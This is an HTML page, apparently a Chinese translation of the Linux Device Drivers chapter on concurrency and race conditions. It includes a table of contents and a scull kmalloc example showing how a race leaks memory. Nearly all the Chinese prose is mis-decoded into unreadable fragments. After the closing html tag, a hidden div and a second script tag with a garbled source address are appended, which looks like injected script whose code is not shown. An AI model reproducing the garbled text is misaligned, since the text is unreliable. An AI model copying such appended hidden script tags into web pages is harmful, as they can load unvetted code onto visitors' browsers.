<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;5&#160;&#160;;-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch04s06.html" title="4.6.&#160;ع">
<link rel="next" href="ch05s02.html" title="5.2.&#160;Ĺ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;5&#160;&#160;;</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch04s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch05s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="ConcurrencyandRaceContitions.chap"></a>&#160;5&#160;&#160;;</h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch05.html#Pitfallsinscull.sect">5.1. scull еȱ</a></span></dt>
<dt><span class="sect1"><a href="ch05s02.html">5.2. Ĺ</a></span></dt>
<dt><span class="sect1"><a href="ch05s03.html">5.3. ͻ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch05s03.html#TheLinuxSemaphoreImplementation.sect">5.3.1. Linux ʵ</a></span></dt>
<dt><span class="sect2"><a href="ch05s03.html#UsingSemaphoresinscull.sect">5.3.2.  scull ʹ</a></span></dt>
<dt><span class="sect2"><a href="ch05s03.html#ReaderWriterSemphores.sect">5.3.3. /д</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch05s04.html">5.4. Completions </a></span></dt>
<dt><span class="sect1"><a href="ch05s05.html">5.5. </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch05s05.html#IntroductiontotheSpinlockAPI.sect">5.5.1.  API </a></span></dt>
<dt><span class="sect2"><a href="ch05s05.html#SpinlocksandAtomicContext.sect">5.5.2. ԭ</a></span></dt>
<dt><span class="sect2"><a href="ch05s05.html#TheSpinlockFunctions.sect">5.5.3. </a></span></dt>
<dt><span class="sect2"><a href="ch05s05.html#ReaderWriterSpinlocks.sect">5.5.4. /д</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch05s06.html">5.6. </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch05s06.html#AmbiguousRules.sect">5.6.1. ģĹ</a></span></dt>
<dt><span class="sect2"><a href="ch05s06.html#LockOrderingRules.sect">5.6.2. ˳</a></span></dt>
<dt><span class="sect2"><a href="ch05s06.html#FineVersusCoarseGrainedLocking.sect">5.6.3. ϸ -- ȼ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch05s07.html">5.7. ĸѡ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch05s07.html#LockFreeAlgorithms.sect">5.7.1. 㷨</a></span></dt>
<dt><span class="sect2"><a href="ch05s07.html#AtomicVariables.sect">5.7.2. ԭӱ</a></span></dt>
<dt><span class="sect2"><a href="ch05s07.html#BitOperations.sect">5.7.3. λ</a></span></dt>
<dt><span class="sect2"><a href="ch05s07.html#seqlocks.sect">5.7.4. seqlock </a></span></dt>
<dt><span class="sect2"><a href="ch05s07.html#ReadCopyUpdate.sect">5.7.5. ȡ--</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch05s08.html">5.8. ٲο</a></span></dt>
</dl>
</div>
<p>, δĲ -- ˵, ϵͳͼһʱ. Ȼ, Ĺǲϵͳ̵ĺ֮һ. صĴһЩ׳ѷֵ. רҼ Linux ں˳ԱżҲֲصĴ.</p>
<p>ڵ Linux ں, вԴͷ. ں˲ֶ֧Գƶദ(SMP)ϵͳ, ִеΨһԭӲжϷ. Ǹṩ˼, ԽԽദϵͳעܲҼϵͳҪӦ¼ٿ. ΪӦִӲӦóҪ, Linux ںѾչΪܶͬʱ. Ѿ˺ܴܺͿչ. Ȼ, Ҳܴʹں˱ӻ. 豸ԱڱһʼͽΪƵҪ, ǱںṩĲʩкǿ.</p>
<p>µĿǿʼĹ. ΪĿ, ǽһЩʩӦõ 3 µ scull . չʾʩʱʹ. , ǿһǵļ scull ⲢαЩǱڵ.</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="Pitfallsinscull.sect"></a>5.1.&#160;scull еȱ</h2></div></div></div>
<p>ǿٿһ scull ڴ. д߼, scull ڴǷѾ. Ĵ:</p>
<pre class="programlisting">
if (!dptr-&gt;data[s_pos]) {
    dptr-&gt;data[s_pos] = kmalloc(quantum, GFP_KERNEL);
    if (!dptr-&gt;data[s_pos])
        goto out;
}
</pre>
<p> 2 ( ǻΪ"A""B" ) ͼдͬһ schull 豸ͬƫ. ÿͬʱƬεĵһе if . Եָ NULL, ÿ̶ڴ, ÿḴƽָ dptr-&gt;datat[s_pos]. Ϊ 2 ̶ڸֵͬһλ, ȻֻһֵԳɹ.</p>
<p>Ȼ, ǵ 2 ɸֵĽ̽"ʤ".  A ȸֵ, ĸֵ B . ڴ, scull ȫ A ڴ; ָֻ B ڴָ. A ָ, , Ҳٷظϵͳ.</p>
<p>˳һʾ. ǶԹݵ޿ƴȡĽ. Ĵȡģʽ, ˲ϣĶ. ۵ľ, ڴй©. Ѿ㹻, Ǿϵͳ. ԱܱջӾΪ൱ͿԵ¼. , ڼ, ֮һ¼ÿ뷢, Һص.</p>
<p>ܿǽȥ scull ľ, ҪԲһձĻع.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch04s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch05s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">4.6.&#160;ع&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;5.2.&#160;Ĺ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>